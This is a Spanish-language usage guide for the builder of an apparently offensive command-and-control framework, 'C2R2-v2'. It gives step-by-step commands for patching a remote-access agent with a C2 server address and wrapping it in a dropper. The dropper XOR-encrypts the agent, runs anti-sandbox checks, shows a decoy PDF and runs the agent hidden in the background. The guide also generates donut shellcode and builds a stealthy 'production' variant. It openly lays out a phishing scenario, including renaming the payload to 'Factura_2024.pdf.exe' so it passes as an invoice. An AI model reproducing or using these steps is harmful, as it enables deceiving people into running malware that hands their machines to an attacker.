# Uso del Builder para Configurar Agentes y Droppers

## 📋 Comandos Disponibles

### 1. `patch-agent` - Configurar Agente Pre-compilado (Recomendado)

**Este es el método recomendado para usuarios finales** que descargaron un release de GitHub.

Parchea un `agent.exe` pre-compilado con una nueva dirección IP/Puerto **sin necesidad de Rust ni compiladores**.

```bash
# Windows
.\builder.exe patch-agent --input agent\agent.exe --output mi_agente.exe --server 192.168.1.201:4444

# Linux x86_64
./builder-linux-x86_64 patch-agent --input agent/agent.exe --output mi_agente.exe --server 192.168.1.201:4444

# Linux ARM64 (Raspberry Pi)
./builder-linux-arm64 patch-agent --input agent/agent.exe --output mi_agente.exe --server 192.168.1.201:4444
```

**Ventajas:**
- ✅ No requiere Rust instalado
- ✅ No requiere MinGW ni compiladores
- ✅ Funciona en cualquier plataforma
- ✅ Modifica el binario en segundos
- ✅ Perfecto para distribución a clientes

**Limitaciones:**
- ⚠️ Solo puede cambiar IP/Puerto (máximo 64 caracteres)
- ⚠️ No puede cambiar entre modo desarrollo/producción

### 2. `generate-dropper` - Generar Dropper Standalone (NUEVO)

**Este es el método recomendado para crear droppers** sin necesidad de compilar.

Genera un dropper que embebe un agente pre-compilado. El dropper extraerá y ejecutará el agente automáticamente.

```bash
# Windows
.\builder.exe generate-dropper --agent mi_agente.exe --template dropper-rust\dropper.exe --output factura

# Linux
./builder generate-dropper --agent mi_agente.exe --template dropper-rust/dropper.exe --output factura
```

**Ventajas:**
- ✅ No requiere Rust instalado
- ✅ No requiere donut ni shellcode
- ✅ Crea droppers en segundos
- ✅ El agente se encripta con XOR automáticamente
- ✅ Incluye anti-sandbox checks
- ✅ Puede mostrar PDF de señuelo

**Flujo típico:**
```bash
# 1. Parchear agente con IP correcta
./builder patch-agent --input agent.exe --output mi_agente.exe --server 10.0.0.1:4444

# 2. Generar dropper con el agente parcheado
./builder generate-dropper --agent mi_agente.exe --template dropper.exe --output Factura_2024

# 3. Renombrar a algo convincente
mv Factura_2024.exe "Factura_2024.pdf.exe"
```

### 3. `build-agent` - Compilar desde Código Fuente

**Solo para desarrolladores** con el código fuente completo y Rust instalado.

Compila un nuevo `agent.exe` desde cero con configuración específica.

```bash
# Modo desarrollo (con consola y debug prints)
./builder build-agent --name mi_agente --server 192.168.1.201:4444

# Modo producción (stealthy, sin consola)
./builder build-agent --name mi_agente --server 192.168.1.201:4444 --production
```

**Requisitos:**
- Rust toolchain instalado
- MinGW-w64 (para cross-compilación a Windows)
- Código fuente completo del proyecto
- Target `x86_64-pc-windows-gnu` instalado

**Ventajas:**
- ✅ Control completo sobre features
- ✅ Puede cambiar entre dev/prod
- ✅ Puede modificar cualquier parámetro

### 4. `build-dropper` - Compilar Dropper con Shellcode (Avanzado)

**Para usuarios avanzados** que quieren usar shellcode personalizado.

Requiere generar shellcode con donut y tener Rust instalado.

```bash
# Generar shellcode con donut
donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2

# Compilar dropper
./builder build-dropper --shellcode shellcode.bin --decoy documento.pdf --output dropper
```

**Requisitos:**
- Rust + MinGW instalados
- Donut para generar shellcode
- PDF de señuelo (opcional)

## 🎯 ¿Cuál Usar?

### Para configurar agentes → `patch-agent`
- Descargaste un release de GitHub
- No tienes Rust instalado
- Solo necesitas cambiar la IP/Puerto

### Para crear droppers → `generate-dropper`
- Quieres wrappear el agente en un dropper
- No quieres lidiar con shellcode/donut
- Necesitas un ejecutable que parezca un documento

### Para desarrollo → `build-agent` / `build-dropper`
- Tienes el código fuente completo
- Tienes Rust + MinGW instalados
- Necesitas personalizar features

## 📝 Ejemplos Prácticos

### Escenario 1: Cliente descargó release

```bash
# El cliente descarga C2R2-v2-vX.X.X.zip de GitHub
unzip C2R2-v2-vX.X.X.zip
cd C2R2-v2

# Configurar agente para su servidor
.\builder\builder.exe patch-agent \
    --input agent\agent.exe \
    --output agente_empresa.exe \
    --server 203.0.113.45:4444

# Listo! Ya tiene agente_empresa.exe configurado
```

### Escenario 2: Generar dropper para phishing

```bash
# 1. Parchear agente
./builder patch-agent \
    --input agent.exe \
    --output agente_config.exe \
    --server mi-c2-server.com:443

# 2. Generar dropper
./builder generate-dropper \
    --agent agente_config.exe \
    --template dropper.exe \
    --output factura_enero

# 3. El resultado es factura_enero.exe que:
#    - Muestra un PDF de señuelo
#    - Ejecuta el agente en segundo plano
#    - Incluye evasión anti-sandbox
```

### Escenario 3: Desarrollador con código fuente

```bash
# Clonar repositorio
git clone https://github.com/G4sp4rCS/C2R2-v2
cd C2R2-v2

# Compilar agente en modo producción
cargo build --release --target x86_64-pc-windows-gnu --package builder
./target/x86_64-pc-windows-gnu/release/builder.exe build-agent \
    --name cliente_A \
    --server 203.0.113.45:4444 \
    --production
```

## 🔧 Detalles Técnicos

### Cómo Funciona el Patching

1. El agente se compila con un **marcador mágico** en el binario:
   ```
   C2R2_SERVER_ADDRESS_PLACEHOLDER_
   ```

2. El builder busca este marcador en el `.exe`

3. Reemplaza los bytes siguientes con la nueva IP/Puerto

4. Mantiene padding de nulls para permitir IPs de diferentes longitudes

### Cómo Funciona el Dropper Generator

1. Lee el dropper template pre-compilado
2. Encripta el agente con XOR (clave aleatoria de 32 bytes)
3. Anexa al final del dropper:
   - Marcador de payload
   - Clave XOR
   - Agente encriptado
   - Marcador de fin
4. El dropper, al ejecutarse:
   - Lee su propio ejecutable
   - Extrae y desencripta el agente
   - Lo escribe a temp con nombre aleatorio
   - Lo ejecuta en segundo plano

### Limitaciones del Patching

- **Longitud máxima:** 64 caracteres para `IP:PUERTO`
  - ✅ `192.168.1.100:4444` (20 chars) → OK
  - ✅ `c2.example-domain.com:8443` (28 chars) → OK
  - ❌ `very-long-subdomain.very-long-domain.very-long-tld.com:12345` → ERROR

- **Solo IP/Puerto:** No puede cambiar otras configuraciones

## 🐛 Troubleshooting

### Error: "Marcador no encontrado en el binario"

**Causa:** El agente fue compilado sin soporte para patching.

**Solución:** 
1. Usa `build-agent` para recompilar con el código actualizado
2. O descarga un release oficial que incluye el marcador

### Error: "Dirección de servidor demasiado larga"

**Causa:** La IP/Puerto excede 64 caracteres.

**Solución:**
- Usa una IP más corta
- Usa un dominio más corto
- Reduce el número de puerto (ej: 4444 en lugar de 44444)

### Error: "Template dropper no encontrado"

**Causa:** El dropper template no existe en la ruta especificada.

**Solución:**
1. Descarga el release que incluye `dropper.exe`
2. O compila el dropper: `cargo build --release --target x86_64-pc-windows-gnu -p dropper`

## 📚 Referencias

- **GitHub Releases:** https://github.com/G4sp4rCS/C2R2-v2/releases
- **Documentación Completa:** Ver README.md principal
- **Soporte:** Abrir issue en GitHub
